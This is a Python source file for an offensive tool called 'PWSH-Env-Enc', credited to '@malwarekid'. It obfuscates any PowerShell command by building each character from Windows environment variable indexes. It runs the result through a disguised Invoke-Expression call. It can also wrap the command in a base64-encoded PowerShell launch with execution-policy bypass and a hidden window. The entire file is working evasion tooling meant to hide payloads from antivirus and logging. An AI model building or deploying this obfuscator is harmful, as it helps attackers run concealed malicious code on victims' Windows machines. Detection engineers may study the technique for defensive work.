import os
import base64
import random
from typing import Dict, List

def rh(prompt: str) -> str:
    return input(prompt)

def rfc(path: str) -> str:
    with open(path, "r") as file:
        return file.read()

def gem(ev: List[str]) -> Dict[str, Dict[str, List[int]]]:
    em = {}
    for var in ev:
        value = os.environ.get(var, "")
        if value:
            for char in value:
                if char not in em:
                    em[char] = {}
                if var not in em[char]:
                    em[char][var] = []
                em[char][var].append(value.index(char))
    return em

def eo(string: str, em: Dict[str, Dict[str, List[int]]]) -> List[str]:
    obf_code = []
    for char in string:
        options = em.get(char)
        if not options:
            obf_code.append(f"[char]{ord(char)}")
            continue
        chosen = random.choice(list(options.keys()))
        possible_indices = options[chosen]
        chosen_index = random.choice(possible_indices)
        new_char = os.environ[chosen][chosen_index]
        pwsh_syntax = f"$env:{chosen}[{chosen_index}]"
        obf_code.append(pwsh_syntax)
    return obf_code

def po(string: str, em: Dict[str, Dict[str, List[int]]]) -> str:
    iex = eo("iex", em)
    pieces = eo(string, em)
    iex_stage = "($( {} ) -Join $($null))".format(",".join(iex))
    payload_stage = "($( {} ) -Join $($null))".format(",".join(pieces))
    return "& {} {}".format(iex_stage, payload_stage)

def main():

    print("\033[38;2;255;69;172m" + r'''
    ____ _       _______ __  __      ______                 ______          
   / __ \ |     / / ___// / / /     / ____/___ _   __      / ____/___  _____
  / /_/ / | /| / /\__ \/ /_/ /_____/ __/ / __ \ | / /_____/ __/ / __ \/ ___/
 / ____/| |/ |/ /___/ / __  /_____/ /___/ / / / |/ /_____/ /___/ / / / /__  
/_/     |__/|__//____/_/ /_/     /_____/_/ /_/|___/     /_____/_/ /_/\___/  
                                                             By @malwarekid
''' + "\033[0m""\033[32m")

    powershell_cmd = rh("Powershell command (leave empty for SCRIPT file) : ")

    if not powershell_cmd:
        pf = rh("Script Path : ")
        powershell_cmd = rfc(pf)

    cpe = rh("Pre encode the command? (helpful if your command has ' or \" or $ characters) [y/n]")
    out_to_file = rh("Wants to save the file? [y/n]" + "\033[0m")

    ev = [
        "ALLUSERSPROFILE",
        "CommonProgramFiles",
        "CommonProgramW6432",
        "ComSpec",
        "PATHEXT",
        "ProgramData",
        "ProgramFiles",
        "ProgramW6432",
        "PSModulePath",
        "PUBLIC",
        "SystemDrive",
        "SystemRoot",
        "windir"
    ]

    em = gem(ev)

    if cpe.lower() == 'y':
        print("Original Command\n================================\n{}\n================================".format(powershell_cmd))
        to_encode = powershell_cmd
        encoded_command = base64.b64encode(to_encode.encode("utf-16le")).decode()
        full_command = f"Start-Process PowerShell.exe -ArgumentList ('-ep bypass -w h -e {encoded_command}')"
        print("Encoded Command\n================================\n{}\n================================".format(full_command))
        encoded = po(full_command, em)
    else:
        print("Original Command\n================================\n{}\n================================".format(powershell_cmd))
        encoded = po(powershell_cmd, em)

    print("\033[31m" + r"FINAL Encoded Command"+ "\033[0m""\n================================\n{}\n================================".format(encoded))

    if out_to_file.lower() == 'y':
        with open('encoded.ps1', 'w') as file:
            file.write(encoded)
        print("================================\nFile saved to 'encoded.ps1'\n================================")

if __name__ == "__main__":
    main()
